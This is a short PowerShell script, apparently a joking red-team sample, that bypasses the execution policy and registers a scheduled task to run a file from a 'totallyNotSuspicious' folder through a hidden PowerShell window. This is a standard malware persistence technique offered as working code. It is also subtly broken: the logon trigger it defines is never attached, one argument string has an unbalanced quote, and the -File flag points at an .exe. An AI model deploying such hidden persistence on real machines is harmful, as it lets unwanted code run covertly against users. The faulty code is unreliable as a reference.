$whoami=whoami.exe
Set-ExecutionPolicy Bypass -Scope Process -Force;

$whoami=whoami.exe
$taskname = "not malicious!!11!1"
$taskdescription = "checking in"
$P = New-ScheduledTaskPrincipal -UserID $whoami -RunLevel Limited
$A = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden  -File ""C:\totallyNotSuspicious\print.exe"
$trigger =  New-ScheduledTaskTrigger -AtLogon

Register-ScheduledTask -Action $A  -Principal $P -TaskName $taskname -Description $taskdescription